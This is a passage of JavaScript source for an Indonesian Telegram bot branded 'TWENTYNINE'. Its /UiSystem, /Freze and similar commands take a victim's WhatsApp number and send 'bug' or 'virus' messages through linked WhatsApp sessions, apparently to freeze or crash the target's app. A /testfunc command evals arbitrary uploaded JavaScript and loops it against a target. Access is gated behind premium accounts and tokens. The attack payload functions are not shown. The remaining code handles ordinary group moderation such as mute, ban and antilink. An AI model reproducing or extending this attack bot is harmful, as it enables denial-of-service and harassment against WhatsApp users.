`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>    
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Force Click
☇ Status : Proses.. 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await (target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>   
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Force Click
☇ Status : Sucses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/UiSystem (\d+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const userId = msg.from.id;
 const date = getCurrentDate();
 const targetNumber = match[1];
 const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
 const target = `${formattedNumber}@s.whatsapp.net`;
 const randomImage = getRandomImage();
 const cooldown = checkCooldown(userId);
 const chatType = msg.chat.type;
 const isPremium = await premium (senderId);
 const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/uisystem')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}

   
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
  
       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote> 
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Ui Sistem
☇ Status : Proses.. 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await uisis(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Ui Sistem
☇ Status : Sucses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/Freze (\d+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const userId = msg.from.id;
 const date = getCurrentDate();
 const targetNumber = match[1];
 const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
 const target = `${formattedNumber}@s.whatsapp.net`;
 const randomImage = getRandomImage();
 const cooldown = checkCooldown(userId);
 const chatType = msg.chat.type;
 const isPremium = await premium (senderId);
 const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/uisystem')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}

   
   if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa17" ); 
    }
     
if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  
  
       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄E ⎭ ⊰―═⬡</blockquote>
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Freze
☇ Status : Proses.. 
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await frezewa(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>⬡═—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―═⬡</blockquote>
☇ Pengirim : ${username}
☇ Target : ${formattedNumber}
☇ Virus  : Freze 
☇ Status : Sucses
☇ Date now : ${date}

「 ⸸ 」 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ☇ 2025 `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "「 🔍 」CEK TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   


bot.onText(/\/testfunc (\d+),(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const loopCount = parseInt(match[2]);
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }
if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 ☇ Kamu belum Verifikasi token.\n🔑 ☇ Format : /verip <token> ",
    );
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @nanaYa18");
  }

  if (!verifiedData.fullyVerified.includes(chatId)) {
    return bot.sendMessage(chatId, "🔐 ☇ Kamu Belum Memasukan Password!\n🔑 ☇ Format : /pw <pasword>");
  }
  

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isPremium) {
    return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }

  // ✅ try utama dibuka
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx");
    }

    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, "❌ Reply pesan ini ke file JavaScript atau kode function yang ingin di-test!");
    }

    const repliedMsg = msg.reply_to_message;

    try {
      let testFunction;

      if (repliedMsg.document && repliedMsg.document.file_name.endsWith('.js')) {
        const fileLink = await bot.getFileLink(repliedMsg.document.file_id);
        const response = await fetch(fileLink);
        const fileContent = await response.text();

        const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
        if (!funcMatch) {
          return bot.sendMessage(chatId, "❌ File JavaScript tidak mengandung async function yang valid!");
        }

        eval(fileContent);
        testFunction = eval(funcMatch[1]);
      } else if (repliedMsg.text) {
        const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
        if (!funcMatch) {
          return bot.sendMessage(chatId, "❌ Kode tidak mengandung async function yang valid!");
        }

        eval(repliedMsg.text);
        testFunction = eval(funcMatch[1]);
      } else {
        return bot.sendMessage(chatId, "❌ Format tidak didukung! Kirim file .js atau kode function.");
      }

      if (typeof testFunction !== 'function') {
        return bot.sendMessage(chatId, "❌ Gagal memuat function!");
      }

      const progressMsg = await bot.sendMessage(chatId, `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`);

      let successCount = 0;
      let errorCount = 0;
      const errors = [];

      for (let i = 0; i < loopCount; i++) {
        try {
          await testFunction(sock, target);
          await sleep(1000);
          successCount++;

          if (i % Math.ceil(loopCount / 10) === 0) {
            const progress = Math.round((i / loopCount) * 100);
            await bot.editMessageText(`🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: █${'█'.repeat(progress / 10)}${'░'.repeat(10 - progress / 10)} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`, {
              chat_id: chatId,
              message_id: progressMsg.message_id
            });
          }

          await sleep(1500);
        } catch (err) {
          errorCount++;
          errors.push(`Loop ${i + 1}: ${err.message}`);
          console.error(`Error di loop ${i + 1}:`, err);
        }
      }

      let resultText = `<blockquote>⬡═—⊱ ⎧ GHOST PRIDE ⎭ ⊰―═⬡</blockquote>\n\n`;
      resultText += `🎯 Target: ${formattedNumber}\n`;
      resultText += `🔄 Total Loop: ${loopCount}x\n`;
      resultText += `✅ Success: ${successCount}\n`;
      resultText += `❌ Error: ${errorCount}\n`;
      resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

      if (errors.length > 0) {
        resultText += `🚨 **ERROR DETAILS:**\n`;
        resultText += errors.slice(0, 5).join('\n');
        if (errors.length > 5) {
          resultText += `\n... dan ${errors.length - 5} error lainnya`;
        }
      }

      await bot.editMessageText(resultText, {
        chat_id: chatId,
        message_id: progressMsg.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 🔍 」CEK TARGET", url: `wa.me/${formattedNumber}` }]
          ]
        }
      });
    } catch (error) {
      bot.sendMessage(chatId, `❌ Error saat testing: ${error.message}`);
    }

  // ✅ ini penutup try utama
  } catch (e) {
    console.error("Error utama:", e);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan utama: ${e.message}`);
  }
});

// Listener untuk perintah /extractfunc
bot.onText(/\/extractfunc/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
   if (isGroupOnly() && chatType === 'private') {
   return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/extracfunc')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
  try {
    // Pastikan pesan ini reply ke pesan sebelumnya
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
      return bot.sendMessage(chatId, "❌ Harus reply ke file .js atau .json");
    }

    const reply = msg.reply_to_message;
    const fileName = reply.document.file_name.toLowerCase();

    if (!fileName.endsWith('.js') && !fileName.endsWith('.json')) {
      return bot.sendMessage(chatId, "❌ File harus berformat .js atau .json!");
    }

    const fileId = reply.document.file_id;

    // Dapatkan URL download file
    const fileLink = await bot.getFileLink(fileId);

    // Ambil isi file
    const response = await axios.get(fileLink);
    const fileContent = response.data;

    // Regex untuk menemukan fungsi
    const functionRegex =
      /(async\s+)?function\s+([a-zA-Z0-9_]+)\s*\([^)]*\)\s*\{[^}]*\}|const\s+([a-zA-Z0-9_]+)\s*=\s*\([^)]*\)\s*=>\s*\{[^}]*\}/g;

    const matches = fileContent.match(functionRegex);

    if (!matches || matches.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan function di file ini.");
    }

    const result = matches.join("\n\n");

    // Kirim hasil, batasi agar tidak melebihi batas pesan Telegram
    const maxLength = 4000;
    const messageText =
      '🧩 Celah ditemukan!\n\njavascript\n' +
      result.slice(0, maxLength) +
      '\n .';

    await bot.sendMessage(chatId, messageText, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat memproses file.");
  }
});


//=========( GROUP  )=======\\
bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  

    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-mute.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 Pengguna telah di-mute di grup ini oleh admin.',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});

bot.onText(/^\/unmute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
   const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-unmute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unmute pengguna
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: true,
                can_send_media_messages: true,
                can_send_polls: true,
                can_send_other_messages: true,
                can_add_web_page_previews: true,
                can_invite_users: true,
                can_pin_messages: false,  // Bisa disesuaikan
                can_change_info: false    // Bisa disesuaikan
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-unmute.`,
            { parse_mode: 'Markdown' });

        // Balas ke pesan pengguna
        await bot.sendMessage(chatId,
            '🔊 Pengguna telah di-unmute di grup ini, silakan mengobrol kembali.',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unmute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unmute.');
    }
});

bot.onText(/^\/ban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-ban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Ban pengguna
        await bot.banChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-ban.`,
            { parse_mode: 'Markdown' });

        // Pesan follow-up di bawah reply
        await bot.sendMessage(chatId,
            '🚫 Pengguna telah di-ban dari grup ini oleh admin.',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat ban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan ban.');
    }
});

bot.onText(/^\/unban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-unban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unban pengguna
        await bot.unbanChatMember(chatId, targetUser.id, {
            only_if_banned: true
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-unban.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan
        await bot.sendMessage(chatId,
            '🔓 Pengguna telah di-unban dari grup ini, silakan bergabung kembali.',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unban.');
    }
});

bot.onText(/^\/kick$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-kick.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Kick: ban lalu unban agar bisa join lagi
        await bot.banChatMember(chatId, targetUser.id);
        await bot.unbanChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-kick.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan sebagai reply
        await bot.sendMessage(chatId,
            'Pengguna telah di-kick dari grup ini oleh admin. Pengguna dapat bergabung kembali jika diperbolehkan.😂',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat kick:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan kick.');
    }
});

bot.onText(/^\/invite(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const chatType = msg.chat.type
  const username = match[1]?.trim()
  const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  // Hanya bisa digunakan di grup
  if (chatType !== 'group' && chatType !== 'supergroup') {
    return bot.sendMessage(chatId, 'Perintah ini hanya dapat digunakan di dalam grup.')
  }

  // Cek apakah bot admin
  try {
    const botId = (await bot.getMe()).id
    const botMember = await bot.getChatMember(chatId, botId)
    if (!['administrator', 'creator'].includes(botMember.status)) {
      return bot.sendMessage(chatId, 'Bot harus menjadi admin terlebih dahulu.')
    }
  } catch (err) {
    return bot.sendMessage(chatId, 'Gagal memeriksa status admin bot.')
  }

  // Validasi username
  if (!username) {
    return bot.sendMessage(chatId, 'Silakan masukkan username pengguna (tanpa @).\n\nContoh:\n/invite username')
  }

  // Ambil link undangan grup
  let inviteLink
  try {
    inviteLink = await bot.exportChatInviteLink(chatId)
  } catch (err) {
    return bot.sendMessage(chatId, 'Gagal membuat link undangan. Pastikan bot adalah admin dan memiliki izin membuat link.')
  }

  // Kirim pesan pribadi ke user target
  try {
    await bot.sendMessage(`@${username}`, `≡ *UNDANGAN GRUP*\n\nSeseorang mengundang Anda untuk bergabung:\n${inviteLink}`, {
      parse_mode: 'Markdown'
    })
    bot.sendMessage(chatId, 'Link undangan berhasil dikirim ke pengguna.')
  } catch (err) {
    bot.sendMessage(chatId, 'Gagal mengirim pesan ke pengguna. Pastikan username benar dan pengguna telah memulai chat dengan bot.')
  }
})
bot.onText(/^\/(open|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  if (statusData[msg.chat.id.toString()] === 'off') return;
  
  // Cek apakah di grup
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  // Cek apakah pengirim admin
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isAdmin = admins.some(admin => admin.user.id === userId);
    if (!isAdmin) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'open') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

const statusPath = path.join(__dirname, "bot-status.json");
if (!fs.existsSync(statusPath)) fs.writeFileSync(statusPath, JSON.stringify({}));
let statusData = JSON.parse(fs.readFileSync(statusPath));

const saveStatus = () => {
  fs.writeFileSync(statusPath, JSON.stringify(statusData, null, 2));
};

// Auto mute kalau status off
bot.on("message", (msg) => {
  const chatId = msg.chat.id.toString();
  if (statusData[chatId] === "off") return;
});
bot.onText(/\/setwelcome (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  if (statusData[msg.chat.id.toString()] === 'off') return;
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].welcome = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan welcome disimpan!");
});

bot.onText(/^\/antilink (on|off)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const option = match[1];
  const isGroup = msg.chat.type.includes("group");
 const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  
  if (!isGroup) return bot.sendMessage(chatId, "❌ Perintah ini hanya untuk grup.");

  if (option === "on") {
    antilink[chatId] = true;
    fs.writeFileSync("./antilink.json", JSON.stringify(antilink, null, 2));
    return bot.sendMessage(chatId, "✅ Anti-Link berhasil *diaktifkan*!");
  } else {
    delete antilink[chatId];
    fs.writeFileSync("./antilink.json", JSON.stringify(antilink, null, 2));
    return bot.sendMessage(chatId, "❌ Anti-Link *dimatikan*.");
  }
});
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const isGroup = msg.chat.type.includes("group");
  const text = msg.text;

  if (!isGroup || !text) return;
  if (!antilink[chatId]) return;

  // Deteksi LINK
  const regex = /(https?:\/\/[^\s]+|t\.me\/|chat\.whatsapp\.com|wa\.me)/i;

  if (regex.test(text)) {
    try {
      // Hapus pesan
      await bot.deleteMessage(chatId, msg.message_id);

      // Nama pelaku
      const pelaku =
        msg.from.username
          ? `@${msg.from.username}`
          : msg.from.first_name;

      // Kirim pesan ke grup
      await bot.sendMessage(
        chatId,
        `🚫 Pesan si *${pelaku}* berisi link telah *dihapus otomatis!*`,
        { parse_mode: "Markdown" }
      );

    } catch (err) {
      console.log("Gagal hapus pesan:", err);
    }
  }
});
//========(case md  )=========\\
bot.onText(/\/chat (.+)/, (msg, match) => {
    const messageText = match[1]; 
    sendNotifOwner(msg, `Pesan dari pengguna: ${messageText}`)
      .then(() => {
        bot.sendMessage(msg.chat.id, '𝘗𝘌𝘚𝘈𝘕 𝘈𝘕𝘋𝘈 𝘛𝘌𝘓𝘈𝘏 𝘋𝘐𝘒𝘐𝘙𝘐𝘔 KE NANA 𝘔𝘖𝘏𝘖𝘕 𝘋𝘐𝘛𝘜𝘕𝘎𝘎𝘜 𝘚𝘌𝘉𝘌𝘕𝘛𝘈𝘙');
      })
      .catch(() => {
        bot.sendMessage(msg.chat.id, '𝘛𝘌𝘙𝘑𝘈𝘋𝘐 𝘒𝘌𝘚𝘈𝘓𝘈𝘏𝘈𝘕 𝘚𝘈𝘈𝘛 𝘔𝘌𝘕𝘎𝘐𝘙𝘐𝘔𝘒𝘈𝘕 𝘗𝘌𝘚𝘈𝘕.');
      });
});


bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
